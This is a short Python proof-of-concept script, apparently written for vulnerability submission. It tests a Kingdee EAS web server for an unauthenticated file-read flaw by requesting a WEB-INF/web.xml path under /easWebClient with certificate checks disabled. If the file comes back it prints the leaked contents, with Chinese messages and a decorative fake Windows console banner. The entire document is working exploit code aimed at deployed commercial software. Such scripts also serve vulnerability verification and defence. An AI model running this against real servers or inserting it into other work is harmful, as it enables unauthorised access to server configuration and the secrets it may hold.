#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/easWebClient/deploy/client/ctrlhome/webapps/extweb/WEB-INF/web.xml"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36", "Connection": "close"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "<web-app>" in r.text:
        return r.text
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 kingdee-eas-extweb-fileread.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取 web.xml  的文件内容为：", info)
    else:
        print("[-]漏洞不存在")
